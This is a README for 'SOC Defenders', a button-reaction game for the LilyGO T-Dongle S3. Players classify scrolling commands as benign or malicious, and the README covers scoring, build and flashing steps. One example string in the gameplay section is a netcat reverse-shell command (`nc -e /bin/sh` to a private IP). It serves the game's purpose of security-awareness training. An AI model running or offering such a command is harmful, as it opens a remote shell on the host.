# SOC Defenders

A cybersecurity-themed reaction game for the **LilyGO T-Dongle S3**. Commands scroll across the tiny TFT screen and you must decide: is it benign traffic or a malicious attack? Press the button to act — but watch out, the button's meaning flips randomly between BLOCK and ALLOW for each threat.

## Hardware

- LilyGO T-Dongle S3 (ESP32-S3, 0.96" ST7735 160x80 TFT, BOOT button, APA102 RGB LED)
- No external components required

## Gameplay

### Splash Screen

An animated shield and virus play out on the title screen. Press the **BOOT button** to start.

### How to Play

1. A command string scrolls in from the right (e.g. `kubectl get pods` or `nc -e /bin/sh 10.0.0.9`)
2. Once the text is fully visible, a **countdown timer** starts (6 seconds at level 1, decreasing with level)
3. Check the **BTN=BLOCK** or **BTN=ALLOW** indicator — it changes randomly per threat
4. Decide if the command is **malicious** or **benign**:
   - If malicious, you want to **BLOCK** it
   - If benign, you want to **ALLOW** it
5. Press the button to commit your decision, or let the timer expire (no press)
6. The button meaning + your press/no-press determines the outcome:

| Button Mode | You Press | Effective Action |
|-------------|-----------|-----------------|
| BTN=BLOCK   | Yes       | BLOCK           |
| BTN=BLOCK   | No        | ALLOW           |
| BTN=ALLOW   | Yes       | ALLOW           |
| BTN=ALLOW   | No        | BLOCK           |

You can press the button at any time — even while the text is still scrolling in.

### Scoring

| Outcome                        | Points |
|--------------------------------|--------|
| Correctly BLOCK a malicious cmd | +10    |
| Correctly ALLOW a benign cmd    | +5     |
| Miss a malicious cmd (ALLOW)    | -12, lose a life |
| False positive (BLOCK benign)   | -8, lose a life  |
| 5 correct in a row              | +10 streak bonus |

### Lives and Levels

- Start with **3 lives** (shown as red hearts)
- Every **6 threats resolved**, the level increases
- Higher levels reduce the decision timer (minimum 3 seconds)
- Lose all lives and you're **HACKED** — press the button to restart

### Content

80 command strings (40 benign, 40 malicious) covering real-world scenarios: health checks, backups, SSH sessions, SQL injection, reverse shells, cryptominers, SUID escalation, and more.

## Build from Source

### Prerequisites

- [PlatformIO](https://platformio.org/) (CLI or IDE plugin)
- Python 3.x (for PlatformIO and esptool)

### Build

```bash
# Install PlatformIO if needed
pip install platformio

# Build the firmware
pio run
```

All library dependencies (LovyanGFX, FastLED) are fetched automatically.

### Flash via PlatformIO

```bash
pio run -t upload
```

If the dongle is not detected, enter download mode manually:

1. **Hold** the BOOT button
2. **Plug in** the USB cable (or unplug/replug if already connected)
3. **Release** the BOOT button
4. Run the upload command

### Flash via esptool (manual)

```bash
esptool.py --chip esp32s3 \
  --port /dev/cu.usbmodemXXXXXX \
  --baud 921600 \
  --after no_reset \
  write_flash \
  0x0 .pio/build/tdongle/bootloader.bin \
  0x8000 .pio/build/tdongle/partitions.bin \
  0xe000 boot_app0.bin \
  0x10000 .pio/build/tdongle/firmware.bin
```

After flashing, **unplug and replug** the dongle (without holding BOOT) to start the firmware.

## Flash Pre-built Image

A single merged binary is provided for distribution. No build tools required — just esptool.

```bash
esptool.py --chip esp32s3 \
  --port /dev/cu.usbmodemXXXXXX \
  --baud 921600 \
  --after no_reset \
  write_flash 0x0 soc_defenders.bin
```

Enter download mode first (hold BOOT, plug in, release). After flashing, unplug and replug to boot.

## Project Structure

```
src/
  main.cpp        — Arduino setup/loop, module init
  game.h / .cpp   — Game state, threat spawning, scoring, timer logic
  display.h / .cpp— LovyanGFX TFT driver, HUD, splash, game over screens
  input.h / .cpp  — BOOT button debounce
  events.h / .cpp — Random content selection (no repeats)
  board_led.h/.cpp— APA102 RGB LED heartbeat
  content.h       — 80 benign/malicious command strings
include/
  User_Setup_TDongle.h — TFT_eSPI pin config (legacy, not used with LovyanGFX)
platformio.ini    — Build config (ESP32-S3, Arduino, LovyanGFX, FastLED)
```

## License

Built for BSides 2026. Have fun defending the SOC.
